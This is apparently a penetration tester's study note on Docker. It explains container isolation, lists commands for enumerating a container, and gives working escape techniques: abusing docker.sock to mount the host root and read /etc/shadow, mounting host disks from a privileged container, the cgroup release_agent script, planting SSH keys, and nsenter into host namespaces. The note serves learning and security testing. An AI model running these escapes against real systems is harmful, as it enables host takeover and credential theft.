# Fundamentals 

## Image vs Container

- **Image**: read-only template with the application and its dependencies. It never runs.
- **Container**: running instance of an image. A set of processes on the **host kernel** with their own namespaces and a writable layer.
- **Docker**: daemon (`dockerd`) + client (`docker`). The daemon is the privileged component that creates namespaces and mounts, and exposes an API through `/var/run/docker.sock`.

## Isolation

A container, shares the host kernel. Isolation comes from:

- **Namespaces**: limit the process can see (PID, network, mount, UTS, IPC, user...).
- **Capabilities**: limit the process can do even when root.
- **cgroups**: limit and control resource usage for processes (CPU, RAM, PIDs, I/O, etc.).
- **seccomp / AppArmor / SELinux**: syscall and LSM restrictions.
- **Read-only rootfs** and no host devices by default.

Because the kernel is shared, a kernel vulnerability or a misconfiguration (privileged container, extra capabilities, `docker.sock`) can break this isolation and allow an **escape**.

## Capabilities

A normal Docker container disables most of the capabilities, so root inside a container is a restricted root. 
If the container was started with `--cap-add` or `--privileged`, dangerous capabilities may be present and become a escape vector.

## Docker Socket

`/var/run/docker.sock` is the **UNIX socket** through which the Docker daemon (`dockerd`) exposes its API. Access to the socket allows a process to interact with the daemon and manage Docker resources.

On the host, it is typically owned by `root` and the `docker` group, so access is normally restricted to `root` and users with permission to access the socket.

Finding the socket inside a container usually means it has been **bind-mounted from the host**, giving the container access to the host's Docker daemon.

**Why it's critical:** the Docker daemon runs on the host and has highly privileged access to it. If we can interact with the daemon, we can create a container that **bind-mounts the host filesystem** (`/`). This allows the new container to access and modify files on the host, effectively breaking the container's filesystem isolation.

---

# Enumeration

## Are we in a container?

```bash
ls -la /.dockerenv
cat /proc/1/cgroup
cat /proc/self/mountinfo | grep overlay
hostname
```

- `/.dockerenv`: marker file created by Docker. Present in containers.
- `/proc/1/cgroup`: a `docker/<id>` path (or `kubepods/...` under [[Kubernetes|Kubernetes]]) means we are in a container.
- `overlay` in `mountinfo`: the container root is an overlay of layers, typical of a container filesystem.
- `hostname`: a long hex string is usually the container ID.

## User and processes

```bash
id
ps aux
```

- `id`: running as root inside a container is common and is required by most escapes.
- `ps aux`: only shows the processes in the container's PID namespace. If the full host process tree appears (systemd, sshd...), the PID namespace is shared with the host (`--pid=host`).
- PID 1 is the first process in a PID namespace. In a container, it is the main process started and acts as the root of the container's process tree. Is useful to understand which process is running the container.

## Network

```bash
ip addr
ip route
cat /etc/resolv.conf
```

- `ip addr`: the container interface and its IP, the host is usually on the same bridge network.
- `ip route`: the default gateway is normally the host bridge (e.g. `172.17.0.1`), a good pivot target.
- `resolv.conf`: may reveal an internal DNS server.

```bash
cat /proc/net/route
```

This file exposes the IPv4 routing table from the container's network namespace. It is useful when tools such as `ip` or `route` are not installed.

The addresses are represented in hexadecimal and use little-endian byte order.

```txt
Iface   Destination   Gateway
eth0    00000000      010011AC
```

Convert `010011AC` to an IPv4 address:

`010011AC` -> `01 00 11 AC` -> `AC 11 00 01` -> `172.17.0.1`

## Filesystem and mounts

```bash
mount
cat /proc/mounts
ls -la /
```

- Look for **bind mounts** of host paths (`/etc`, `/var/run/docker.sock`, `/home`...). A writable bind mount of `/etc` or `/root/.ssh` means instant host compromise.
- `overlay` on `/` confirms we are inside a container filesystem.

## Capabilities

```bash
capsh --print
cat /proc/1/status
cat /proc/self/status
```

- `capsh --print`: current effective and bounding capabilities.
- `cat /proc/1/status`: capabilities of PID 1. `cap_sys_admin`, `cap_sys_ptrace`, `cap_sys_module` or `cap_dac_read_search` in the effective set are red flags. 
- `cat /proc/self/status`: capabilities of the running process
	* `CapEf` -> Effective
	* `CapInh` -> Inheritable
	* `CapPrm` -> Permitted
	* `CapBnd` -> Bounding
	* `CapAmb` -> Ambient
- Decode the capabilities: `capsh --decode=0000003fffffffff`.
- Relevant for escapes:
	* **CAP_SYS_ADMIN**: allows mount and namespace syscalls. The most dangerous for container escapes.
	* **CAP_SYS_PTRACE**: allows ptracing other processes, combined with a shared PID namespace or `docker.sock` it can inject code into host processes.
	* **CAP_SYS_MODULE**: allows loading kernel modules. A malicious module running in the host kernel = full host compromise.
	* **CAP_DAC_READ_SEARCH**: bypasses file read permissions.
	* **CAP_NET_ADMIN**: full network configuration, useful to attack the container network from a single compromised container.

## Devices

```bash
ls -la /dev
lsblk
fdisk -l
```

- Block devices (`/dev/sd*`, `/dev/nvme*`) are not present in a normal container. Seeing them or listing disks with `fdisk -l` is a strong sign of a **privileged** container.

## Kernel and system info

```bash
uname -a
cat /etc/os-release
cat /proc/version
```

- The OS in `/etc/os-release` is the *container's* OS, not the host's.
- `uname -a` gives the host kernel version, useful to look for known kernel CVEs

## Environment

```bash
env
printenv
cat /proc/1/environ
```

- Tokens, database passwords, API keys and service configuration are frequently left in the environment.
- `/proc/1/environ`: environment variables of PID 1 (readable as root).
## Docker socket

```bash
find / -name "docker.sock" 2>/dev/null
ls -la /var/run/docker.sock
curl -s --unix-socket /var/run/docker.sock http://127.0.0.1/version
curl -s --unix-socket /var/run/docker.sock http://127.0.0.1/info
docker -H unix:///var/run/docker.sock ps
```

- `ls -la`: A writable `docker.sock` inside the container is a direct path to the host. 
- `/version`: the API responds, so we can talk to the daemon.
- `/info`: server details (hostname, kernel, storage driver).
- `docker ps`: lists the host's containers.

---

# Container Escapes

An escape requires a misconfiguration that widens what the container can do (extra capabilities, privileged, docker.sock, bad mounts, shared namespaces) or a kernel vulnerability.

## Docker socket

- **Condition:** a writable `/var/run/docker.sock` inside the container.
- **Why:** the daemon creates containers on the host with root privileges.
- **Detect:** `ls -l /var/run/docker.sock`; `find / -name docker.sock`.
- **Result / post-exploitation:** full host RCE through a container that mounts `/`.
- **Example:**

If the `docker` CLI is present:
```bash
docker -H unix:///var/run/docker.sock run -it -v /:/host alpine sh
chroot /host /bin/sh
```

- `-v /:/host` mounts the host root in the new container.
- `chroot /host /bin/sh` changes the root directory of the shell to `/host`, allowing us to access the host filesystem as `/`.
- If the `alpine` image is not available locally, Docker pulls it automatically.

Without the CLI, use the raw API:
```bash
curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"HostConfig":{"Binds":["/:/host"]}}' \
  http://127.0.0.1/containers/create?name=pwn
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/pwn/start
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/pwn/logs?stdout=1
```

- `Binds: ["/:/host"]` makes the daemon mount the host `/` into the new container at `/host`
- The command runs inside it and writes the host's `/etc/shadow` to stdout. `--privileged` is not needed for this.

## Privileged container

- **Condition:** the container was started with `--privileged` (all capabilities, all host devices, seccomp/AppArmor disabled).
- **Why:** nothing restricts root, we can mount the host disk directly.
- **Detect:** `capsh --print` shows the full set (`CapEff: 0000003fffffffff`), `grep Seccomp /proc/self/status` shows `0`, block devices visible with `fdisk -l` / `lsblk`.
- **Result / post-exploitation:** a shell over the host filesystem as root.
- **Example:** mount the host disk and chroot into it.

```bash
mkdir /tmp/host
mount /dev/sda1 /tmp/host
chroot /tmp/host /bin/bash
```
  (find the root partition with `fdisk -l` first; use `/bin/sh` if bash is missing).

## CAP_SYS_ADMIN

- **Condition:** container started with `--cap-add=SYS_ADMIN` (no need for `--privileged`).
- **Why:** CAP_SYS_ADMIN allows mount syscalls, so we can mount a cgroup hierarchy and abuse its `release_agent` to run a script on the host.
- **Detect:** `capsh --print` shows `cap_sys_admin` in the effective set.
- **Result / post-exploitation:** the script runs as root on the host and copies `/etc/shadow` into our container. Same idea with a crontab or an SSH key.
- **Note:** cgroup v1 only, fails on modern cgroup v2 hosts.
- **Example:** classic `release_agent` escape (cgroup v1, overlay2 storage driver):

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

host_path=$(sed -n 's/.*\perdir=\([^,]*\)/\1/p' /proc/self/mountinfo)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

printf '#!/bin/sh\ncat /etc/shadow > %s/shadow\n' "$host_path" > /cmd
chmod +x /cmd
sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'
cat /shadow
```
  When the last process of `/tmp/cgrp/x` exits, the kernel executes `release_agent` on the **host**. Its path is resolved against the host root, and `/cmd` lives in our writable layer, visible from the host at `$host_path/cmd`.

## Bind mounts of host paths

- **Condition:** a host directory mounted into the container (e.g. `-v /etc:/etc`, `-v /:/host`, `-v /root/.ssh:/ssh`).
- **Why:** the mount is performed by the host, so the files are directly readable/writable.
- **Detect:** `mount` / `cat /proc/mounts`, check writability with `touch <path>/test`.
- **Result / post-exploitation:** SSH to the host as root.
- **Example:**

```bash
echo 'ssh-rsa AAAAB3...' >> /mnt/.ssh/authorized_keys
```
  (or, if `/etc` is mounted, add a cron job or a sudoers line).

## Shared PID namespace and CAP_SYS_PTRACE

- **Condition:** `--pid=host` and `CAP_SYS_PTRACE` (or `--privileged`).
- **Why:** with the host PID namespace we see host processes, ptrace can hijack a root one, and its children run in host namespaces.
- **Detect:** `ps aux` shows the whole host process tree (systemd, sshd, host users).
- **Result / post-exploitation:** a shell running in the host's namespaces (host root).
- **Example:** with `--privileged --pid=host`, jump into the host namespaces:

```bash
nsenter -t 1 -m -u -i -n sh
```
  (remount `/proc` if it looks empty: `mount -t proc proc /proc`). With only `CAP_SYS_PTRACE`, attach to a host root process (gdb or a small ctypes stub) and make it spawn a shell.

## Kernel vulnerabilities

- **Condition:** the host kernel has a known exploitable vulnerability.
- **Why:** the container shares the host kernel, so a local privilege escalation exploit runs outside the container's namespaces.
- **Detect:** `uname -a` and search for CVEs matching that exact kernel version.
- **Result / post-exploitation:** kernel-level RCE. Always the last resort, it depends on a specific kernel bug and can crash the machine. 
- **Example:** run the LPE from inside the container.